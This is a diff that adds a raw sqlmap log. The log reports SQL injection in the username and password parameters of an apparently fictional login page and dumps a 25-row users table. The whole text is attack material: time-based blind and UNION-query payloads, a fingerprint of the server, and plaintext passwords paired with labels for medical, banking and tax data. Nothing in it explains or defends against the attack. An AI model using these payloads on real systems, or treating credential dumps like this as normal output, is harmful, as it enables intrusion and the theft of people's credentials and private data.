@@ -1,0 +1,56 @@
+sqlmap identified the following injection point(s) with a total of 109 HTTP(s) requests:
+---
+Parameter: password (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test&password=test' AND (SELECT 1573 FROM (SELECT(SLEEP(5)))tjyf) AND 'Okns'='Okns
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: username=test&password=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162717071,0x4b504550744a564776504c4e787a7054624d416867454a505678725979484e4b6c57436964617549,0x716a7a6b71)-- -
+
+Parameter: username (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 6001 FROM (SELECT(SLEEP(5)))MZJU) AND 'SyvV'='SyvV&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: username=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162717071,0x515071786c45726a734b507842645a54766f4a5857684a4c4a4b49734f47637a7a667a7676564d7a,0x716a7a6b71),NULL,NULL-- -&password=test
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+Database: user_db
+Table: users
+[25 entries]
++----+--------------------+--------------+-----------+-----------+--------------------------+
+| id | username           | password     | cognome   | nome      | dati_sensibili           |
++----+--------------------+--------------+-----------+-----------+--------------------------+
+| 1  | giulia_verdi       | securepass01 | Verdi     | Giulia    | Contatti bancari         |
+| 2  | luca_bianchi       | pass1234!    | Bianchi   | Luca      | Cartella medica          |
+| 3  | anna_rossi         | qwerty987    | Rossi     | Anna      | Dati fiscali             |
+| 4  | samuel_neri        | password456  | Neri      | Samuel    | Stipendio annuale        |
+| 5  | sofia_gialli       | sofia@2023   | Gialli    | Sofia     | Investimenti personali   |
+| 6  | davide_grigi       | d4v1de2024   | Grigi     | Davide    | Patrimonio immobiliare   |
+| 7  | marta_azzurri      | mart4pwd     | Azzurri   | Marta     | Contratto di lavoro      |
+| 8  | alessio_rossi      | al3ss10pass  | Rossi     | Alessio   | Storico di viaggio       |
+| 9  | chiara_blu         | bluChi@123   | Blu       | Chiara    | Informazioni sanitarie   |
+| 10 | federico_arancioni | f3d2023!     | Arancioni | Federico  | Fondi pensione           |
+| 11 | valentina_viola    | Vi0laPass!   | Viola     | Valentina | Codice fiscale           |
+| 12 | simone_nocciola    | simone99$    | Nocciola  | Simone    | Dettagli assicurativi    |
+| 13 | maria_paglia       | m4r1a@pwd    | Paglia    | Maria     | Dati patrimoniali        |
+| 14 | gabriele_granata   | gabr1e13pwd  | Granata   | Gabriele  | Proprietà aziendali      |
+| 15 | francesca_oliva    | oliv4pass@   | Oliva     | Francesca | Storico dei crediti      |
+| 16 | andrea_perla       | andr34safe   | Perla     | Andrea    | Investimenti in borsa    |
+| 17 | ilaria_rubino      | rUb1no!234   | Rubino    | Ilaria    | Dettagli contrattuali    |
+| 18 | paolo_ocra         | pa0lo1990!   | Ocra      | Paolo     | Dati sensibili aziendali |
+| 19 | serena_crema       | crema@serena | Crema     | Serena    | Storico delle polizze    |
+| 20 | giulia_puorto      | fiore<3_pwd  | Puorto    | Giulia    | Dati riservati personali |
+| 21 | ludovica_ambra     | amb1234!     | Ambra     | Ludovica  | Movimenti bancari        |
+| 22 | giorgio_agata      | 4g4ta2023    | Agata     | Giorgio   | Residenza legale         |
+| 23 | beatrice_lilla     | L1llaPwd     | Lilla     | Beatrice  | Informazioni notarili    |
+| 24 | claudio_indaco     | ind@co2024   | Indaco    | Claudio   | Dati personali riservati |
+| 25 | laura_zaffiro      | z4ff1r0_pwd  | Zaffiro   | Laura     | Report finanziari        |
++----+--------------------+--------------+-----------+-----------+--------------------------+
+
